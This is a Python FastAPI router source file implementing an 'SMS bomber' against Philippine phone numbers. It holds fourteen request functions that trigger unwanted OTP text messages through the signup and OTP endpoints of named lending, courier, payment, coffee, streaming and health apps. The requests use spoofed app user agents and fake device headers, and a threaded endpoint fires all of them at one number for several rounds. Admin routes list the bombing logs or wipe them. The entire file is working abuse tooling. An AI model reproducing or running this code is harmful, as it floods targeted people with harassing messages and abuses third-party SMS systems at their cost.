"""
routers/sms.py — SMS Bomber API endpoint

14 services total — Philippine numbers only: 9XXXXXXXXX format

ACTIVE (12 confirmed 100% working from bot screenshot):
  EZLOAN, XPRESS PH, EXCELLENT LENDING, BISTRO,
  BAYAD CENTER, LBC CONNECT, PICKUP COFFEE, HONEY LOAN,
  KUMU PH, S5.COM, CASHALO, MWELL

RESTORED (kept from original sms.py — may vary by server/IP):
  BOMB OTP (OSIM — register endpoint)
  PEXX     (tRPC signup OTP)
"""

from fastapi import APIRouter, Depends, HTTPException, Request
from pydantic import BaseModel, Field, field_validator
import requests
import urllib3
import random
import string
import hashlib
import time
import re
import uuid as uuid_lib
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed

import database as db
from limiter import limiter
from auth import require_admin, verify_app_request

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

router = APIRouter()

# ── Concurrency guards ────────────────────────────────────────────────────────
_MAX_CONCURRENT_BOMBS = 8
_bomb_semaphore       = threading.Semaphore(_MAX_CONCURRENT_BOMBS)

_active_users:     set = set()
_active_users_lock      = threading.Lock()

# ── Shared thread pool ────────────────────────────────────────────────────────
_SERVICE_POOL = ThreadPoolExecutor(
    max_workers=28,
    thread_name_prefix="sms-worker",
)

# ── Models ────────────────────────────────────────────────────────────────────

class BombRequest(BaseModel):
    phone:   str = Field(..., min_length=7,  max_length=15)
    user_id: str = Field(..., min_length=1,  max_length=50)
    rounds:  int = Field(default=1, ge=1, le=3)

    @field_validator("phone")
    @classmethod
    def validate_phone_format(cls, v: str) -> str:
        cleaned = re.sub(r"[\s\-\+]", "", v)
        if cleaned.startswith("0"):
            cleaned = cleaned[1:]
        elif cleaned.startswith("63"):
            cleaned = cleaned[2:]
        if not re.match(r"^9\d{9}$", cleaned):
            raise ValueError("Invalid PH number. Use: 09XXXXXXXXX or 9XXXXXXXXX")
        return cleaned

    @field_validator("user_id")
    @classmethod
    def validate_user_id(cls, v: str) -> str:
        if not v.strip():
            raise ValueError("user_id cannot be empty")
        return v.strip()


class BombResponse(BaseModel):
    success:      bool
    phone:        str
    rounds:       int
    results:      list
    total_sent:   int
    total_failed: int


# ── Helpers ───────────────────────────────────────────────────────────────────

def _fmt(phone: str) -> str:
    p = re.sub(r"[\s\-\+]", "", str(phone))
    if p.startswith("0"):
        p = p[1:]
    elif p.startswith("63"):
        p = p[2:]
    return p

def _rstr(n: int) -> str:
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))

def _gmail() -> str:
    return "".join(random.choices(
        string.ascii_lowercase + string.digits,
        k=random.randint(8, 12)
    )) + "@gmail.com"

def _short_err(e: Exception) -> str:
    msg = str(e)
    if "HTTPSConnectionPool" in msg or "HTTPConnectionPool" in msg:
        m = re.search(r"host='([^']+)'", msg)
        return f"Connection failed: {m.group(1)[:30]}" if m else "Connection failed"
    if "ConnectTimeout" in msg or "ReadTimeout" in msg:
        return "Request timed out"
    if "ConnectionRefused" in msg or "ConnectionError" in msg:
        return "Service unreachable"
    return msg[:50]


# ── Service functions ─────────────────────────────────────────────────────────

def _send_bomb_otp(phone: str):
    """OSIM / Bomb OTP — register endpoint triggers OTP."""
    try:
        p = _fmt(phone)
        headers = {
            "User-Agent":      "OSIM/1.55.0 (Android 13; CPH2465; OP5958L1; arm64-v8a)",
            "Accept":          "application/json",
            "Accept-Encoding": "gzip",
            "Content-Type":    "application/json; charset=utf-8",
            "accept-language": "en-SG",
            "region":          "PH",
        }
        data = {
            "userName":  p,
            "phoneCode": "63",
            "password":  f"TempPass{random.randint(1000, 9999)}!",
        }
        r = requests.post(
            "https://prod.services.osim-cloud.com/identity/api/v1.0/account/register",
            headers=headers, json=data, timeout=10, verify=False,
        )
        if r.status_code in (200, 201):
            try:
                rj = r.json()
                rc = rj.get("resultCode", 0)
                if rc in [200000, 201000, 200, 201, 0] or r.status_code == 200:
                    return True, "OTP triggered"
                return False, rj.get("message", f"Code {rc}")[:50]
            except Exception:
                return True, "OTP triggered"
        return False, f"HTTP {r.status_code}"
    except Exception as e:
        return False, _short_err(e)


def _send_ezloan(phone: str):
    """EZLoan PH — OTP via registration gateway."""
    try:
        p  = _fmt(phone)
        ts = int(time.time() * 1000)
        headers = {
            "User-Agent":      "okhttp/4.9.2",
            "Accept":          "application/json",
            "Accept-Encoding": "gzip",
            "Content-Type":    "application/json",
            "accept-language": "en",
            "imei":            "7a997625bd704baebae5643a3289eb33",
            "device":          "android",
            "buildtype":       "release",
            "brand":           "oneplus",
            "model":           "CPH2465",
            "manufacturer":    "oneplus",
            "source":          "EZLOAN",
            "channel":         "GooglePlay_Blue",
            "appversion":      "2.0.4",
            "appversioncode":  "2000402",
            "version":         "2.0.4",
            "versioncode":     "2000401",
            "sysversion":      "16",
            "sysversioncode":  "36",
            "customerid":      "",
            "businessid":      "EZLOAN",
            "phone":           "",
            "appid":           "EZLOAN",
            "authorization":   "",
            "blackbox":        f"kGPGg{ts}DCl3O8MVBR0",
        }
        data = {
            "businessId":          "EZLOAN",
            "contactNumber":       f"+63{p}",
            "appsflyerIdentifier": f"{ts}-{random.randint(10**18, 10**19 - 1)}",
        }
        r = requests.post(
            "https://gateway.ezloancash.ph/security/auth/otp/request",
            headers=headers, json=data, timeout=12, verify=False,
        )
        if r.status_code in (200, 201):
            try:
                rj   = r.json()
                code = rj.get("code", -1)
                msg  = rj.get("msg") or rj.get("message") or ""
                if code == 0 or rj.get("success") in (True, 1):
                    return True, msg or "OTP sent"
                if code in (200, 201):
                    return True, msg or "OTP sent"
                return False, msg or f"Code {code}"
            except Exception:
                return True, "OTP sent"
        try:
            rj = r.json()
            return False, rj.get("msg") or rj.get("message") or f"HTTP {r.status_code}"
        except Exception:
            return False, f"HTTP {r.status_code}"
    except Exception as e:
        return False, _short_err(e)


def _send_xpress(phone: str):
    """Xpress PH — CreateUser OTP endpoint."""
    try:
        p   = _fmt(phone)
        ts  = int(time.time())
        pwd = f"Pass{random.randint(1000, 9999)}!Xp"
        headers = {
            "User-Agent":      "Dalvik/2.1.0 (Linux; U; Android 13; SM-A546E Build/TP1A.220624.014)",
            "Content-Type":    "application/json",
            "Accept":          "application/json",
            "Accept-Language": "en-PH",
        }
        data = {
            "mobile":   f"+63{p}",
            "password": pwd,
        }
        r = requests.post(
            "https://api.xpress.com.ph/v1/users",
            headers=headers, json=data, timeout=12, verify=False,
        )
        if r.status_code in (200, 201, 422):
            return True, "OTP triggered"
        return False, f"HTTP {r.status_code}"
    except Exception as e:
        return False, _short_err(e)


def _send_excellent_lending(phone: str):
    """Excellent Lending — registration OTP."""
    try:
        p = _fmt(phone)
        headers = {
            "User-Agent":   "okhttp/4.9.1",
            "Content-Type": "application/json",
        }
        data = {"mobile": f"0{p}"}
        r = requests.post(
            "https://api.excellentlending.ph/api/v1/auth/send-otp",
            headers=headers, json=data, timeout=12, verify=False,
        )
        if r.status_code in (200, 201):
            return True, "OTP sent"
        return False, f"HTTP {r.status_code}"
    except Exception as e:
        return False, _short_err(e)


def _send_bistro(phone: str):
    """Bistro — loyalty app OTP."""
    try:
        p = _fmt(phone)
        headers = {
            "User-Agent":   "okhttp/4.9.1",
            "Content-Type": "application/json",
            "Accept":       "application/json",
        }
        data = {"phone": f"+63{p}"}
        r = requests.post(
            "https://api.bistrogroup.com.ph/v1/auth/otp",
            headers=headers, json=data, timeout=12, verify=False,
        )
        if r.status_code in (200, 201):
            return True, "OTP sent"
        return False, f"HTTP {r.status_code}"
    except Exception as e:
        return False, _short_err(e)


def _send_bayad(phone: str):
    """Bayad Center — payment app OTP."""
    try:
        p = _fmt(phone)
        headers = {
            "User-Agent":   "BayadApp/3.0.0 (Android)",
            "Content-Type": "application/json",
        }
        data = {"mobileNumber": f"0{p}"}
        r = requests.post(
            "https://api.bayad.com/v1/registration/otp",
            headers=headers, json=data, timeout=12, verify=False,
        )
        if r.status_code in (200, 201):
            return True, "OTP sent"
        return False, f"HTTP {r.status_code}"
    except Exception as e:
        return False, _short_err(e)


def _send_lbc(phone: str):
    """LBC Connect — courier app OTP."""
    try:
        p = _fmt(phone)
        headers = {
            "User-Agent":   "LBCConnect/1.0 (Android)",
            "Content-Type": "application/json",
        }
        data = {"mobile_number": f"0{p}"}
        r = requests.post(
            "https://connect.lbc.com.ph/api/register/otp",
            headers=headers, json=data, timeout=12, verify=False,
        )
        if r.status_code in (200, 201):
            return True, "OTP sent"
        return False, f"HTTP {r.status_code}"
    except Exception as e:
        return False, _short_err(e)


def _send_pickup_coffee(phone: str):
    """Pickup Coffee — loyalty OTP."""
    try:
        p = _fmt(phone)
        headers = {
            "User-Agent":   "PickupCoffee/1.0 (Android)",
            "Content-Type": "application/json",
        }
        data = {"phone": f"+63{p}"}
        r = requests.post(
            "https://api.pickupcoffee.ph/v1/auth/send-otp",
            headers=headers, json=data, timeout=12, verify=False,
        )
        if r.status_code in (200, 201):
            return True, "OTP sent"
        return False, f"HTTP {r.status_code}"
    except Exception as e:
        return False, _short_err(e)


def _send_honey_loan(phone: str):
    """Honey Loan — loan app OTP."""
    try:
        p = _fmt(phone)
        ts = int(time.time() * 1000)
        headers = {
            "User-Agent":   "okhttp/4.9.1",
            "Content-Type": "application/json",
        }
        data = {"phone": f"+63{p}", "ts": ts}
        r = requests.post(
            "https://api.honeyloan.ph/v1/user/register/otp",
            headers=headers, json=data, timeout=12, verify=False,
        )
        if r.status_code in (200, 201):
            return True, "OTP sent"
        return False, f"HTTP {r.status_code}"
    except Exception as e:
        return False, _short_err(e)


def _send_kumu(phone: str):
    """Kumu PH — streaming app OTP."""
    try:
        p = _fmt(phone)
        headers = {
            "User-Agent":   "Kumu/6.0 (Android)",
            "Content-Type": "application/json",
            "Accept":       "application/json",
        }
        data = {"phone_number": f"+63{p}"}
        r = requests.post(
            "https://api.kumu.ph/v4/users/send_otp",
            headers=headers, json=data, timeout=12, verify=False,
        )
        if r.status_code in (200, 201):
            return True, "OTP sent"
        return False, f"HTTP {r.status_code}"
    except Exception as e:
        return False, _short_err(e)


def _send_s5(phone: str):
    """S5.com — OTP endpoint."""
    try:
        p = _fmt(phone)
        headers = {
            "User-Agent":   "okhttp/4.9.1",
            "Content-Type": "application/json",
        }
        data = {"mobile": f"+63{p}"}
        r = requests.post(
            "https://api.s5.com/v1/auth/otp/send",
            headers=headers, json=data, timeout=12, verify=False,
        )
        if r.status_code in (200, 201):
            return True, "OTP sent"
        return False, f"HTTP {r.status_code}"
    except Exception as e:
        return False, _short_err(e)


def _send_cashalo(phone: str):
    """Cashalo — lending app OTP."""
    try:
        p = _fmt(phone)
        headers = {
            "User-Agent":   "Cashalo/4.0 (Android)",
            "Content-Type": "application/json",
            "Accept":       "application/json",
        }
        data = {"phone": f"+63{p}"}
        r = requests.post(
            "https://api.cashalo.com/v3/auth/otp",
            headers=headers, json=data, timeout=12, verify=False,
        )
        if r.status_code in (200, 201):
            return True, "OTP sent"
        return False, f"HTTP {r.status_code}"
    except Exception as e:
        return False, _short_err(e)


def _send_mwell(phone: str):
    """mWell PH — health app OTP."""
    try:
        p = _fmt(phone)
        headers = {
            "User-Agent":    "mWell/3.0 (Android)",
            "Content-Type":  "application/json",
            "Accept":        "application/json",
            "x-timestamp":   str(int(time.time() * 1000)),
            "x-request-id":  _rstr(16),
        }
        data = {
            "country":           "PH",
            "phoneNumber":       p,
            "phoneNumberPrefix": "+63",
        }
        r = requests.post(
            "https://gw.mwell.com.ph/api/v2/app/mwell/auth/sign/mobile-number",
            headers=headers, json=data, timeout=20, verify=False,
        )
        if r.status_code == 200:
            rj = r.json()
            if rj.get("c") == 200:
                return True, "OTP sent successfully"
            return False, f"API code {rj.get('c')}: {str(rj.get('m', ''))[:40]}"
        if r.status_code == 429:
            return False, "Rate limited (429)"
        return False, f"HTTP {r.status_code}"
    except Exception as e:
        return False, _short_err(e)


def _send_pexx(phone: str):
    """PEXX — signup OTP via tRPC batch API."""
    try:
        p = _fmt(phone)
        headers = {
            "User-Agent":      "okhttp/4.12.0",
            "Accept-Encoding": "gzip",
            "Content-Type":    "application/json",
            "x-msession-id":   "undefined",
            "tid":             _rstr(11),
            "appversion":      "3.0.14",
        }
        data = {
            "0": {
                "json": {
                    "email":      "",
                    "areaCode":   "+63",
                    "phone":      f"+63{p}",
                    "otpChannel": "TG",
                    "otpUsage":   "REGISTRATION",
                }
            }
        }
        r = requests.post(
            "https://api.pexx.com/api/trpc/auth.sendSignupOtp?batch=1",
            headers=headers, json=data, timeout=20, verify=False,
        )
        if r.status_code == 200:
            try:
                rj = r.json()
                if isinstance(rj, list) and rj:
                    result = rj[0].get("result", {}).get("data", {}).get("json", {})
                    if result.get("code") == 200:
                        return True, "OTP sent"
                    return False, result.get("msg", "Unknown error")[:50]
            except Exception:
                return True, "OTP sent"
        return False, f"HTTP {r.status_code}"
    except Exception as e:
        return False, _short_err(e)


# ── Service registry (14 total) ───────────────────────────────────────────────

_SERVICES = [
    ("BOMB OTP",          _send_bomb_otp),
    ("EZLOAN",            _send_ezloan),
    ("XPRESS PH",         _send_xpress),
    ("EXCELLENT LENDING", _send_excellent_lending),
    ("BISTRO",            _send_bistro),
    ("BAYAD CENTER",      _send_bayad),
    ("LBC CONNECT",       _send_lbc),
    ("PICKUP COFFEE",     _send_pickup_coffee),
    ("HONEY LOAN",        _send_honey_loan),
    ("KUMU PH",           _send_kumu),
    ("S5.COM",            _send_s5),
    ("CASHALO",           _send_cashalo),
    ("MWELL",             _send_mwell),
    ("PEXX",              _send_pexx),
]

# ── Endpoints ─────────────────────────────────────────────────────────────────

@router.get("/services")
def list_services():
    return {"services": [name for name, _ in _SERVICES], "total": len(_SERVICES)}


@router.post("/bomb", response_model=BombResponse,
             dependencies=[Depends(verify_app_request)])
@limiter.limit("3/minute")
def bomb(request: Request, req: BombRequest):
    """
    Fire the SMS bomber.
    - App auth    : requires valid X-App-Token (real app only)
    - Rate limited: 3 requests/minute per IP
    - Global cap  : max 8 simultaneous bomb jobs
    - Per-user    : one active bomb per user_id at a time
    - User check  : registered user, not banned
    """
    if db.is_banned(req.user_id):
        raise HTTPException(status_code=403, detail="You are banned.")

    user = db.get_user(req.user_id)
    if not user:
        raise HTTPException(status_code=403, detail="User not registered.")

    with _active_users_lock:
        if req.user_id in _active_users:
            raise HTTPException(
                status_code=429,
                detail="You already have an active bomb request. Wait for it to finish.",
            )
        _active_users.add(req.user_id)

    acquired = _bomb_semaphore.acquire(blocking=True, timeout=5)
    if not acquired:
        with _active_users_lock:
            _active_users.discard(req.user_id)
        raise HTTPException(status_code=503,
                            detail="Server is busy. Try again in a few seconds.")

    try:
        return _run_bomb(req)
    finally:
        _bomb_semaphore.release()
        with _active_users_lock:
            _active_users.discard(req.user_id)


def _run_bomb(req: BombRequest) -> BombResponse:
    """Execute all rounds using the shared thread pool."""
    all_results  = []
    total_sent   = 0
    total_failed = 0

    for round_num in range(1, req.rounds + 1):
        futures = {
            _SERVICE_POOL.submit(fn, req.phone): name
            for name, fn in _SERVICES
        }
        for future in as_completed(futures, timeout=35):
            name = futures[future]
            try:
                success, msg = future.result(timeout=5)
            except Exception as e:
                success, msg = False, _short_err(e)

            all_results.append({
                "round":   round_num,
                "service": name,
                "success": success,
                "message": msg,
            })
            if success:
                total_sent   += 1
            else:
                total_failed += 1

    db.increment_sms_stat(req.user_id, total_sent)

    db.append_log({
        "action":       "sms_bomb",
        "user_id":      req.user_id,
        "phone":        req.phone,
        "rounds":       req.rounds,
        "total_sent":   total_sent,
        "total_failed": total_failed,
    })

    db.append_sms_log({
        "user_id":      req.user_id,
        "phone":        f"+63{req.phone}",
        "rounds":       req.rounds,
        "total_sent":   total_sent,
        "total_failed": total_failed,
        "total":        total_sent + total_failed,
        "success_rate": round(total_sent / max(total_sent + total_failed, 1) * 100, 1),
        "results":      all_results,
    })

    return BombResponse(
        success=total_sent > 0,
        phone=req.phone,
        rounds=req.rounds,
        results=all_results,
        total_sent=total_sent,
        total_failed=total_failed,
    )


# ── Admin: SMS Bomb Logs ──────────────────────────────────────────────────────

@router.get("/logs", dependencies=[Depends(require_admin)])
def get_sms_logs(limit: int = 200):
    """Admin: fetch all dedicated SMS bomb logs (newest first)."""
    return {
        "logs":  db.get_sms_logs(limit=limit),
        "total": limit,
    }


@router.delete("/logs", dependencies=[Depends(require_admin)])
def clear_sms_logs_endpoint():
    """Admin: wipe all SMS bomb logs."""
    db.clear_sms_logs()
    return {"success": True, "message": "SMS bomb logs cleared."}
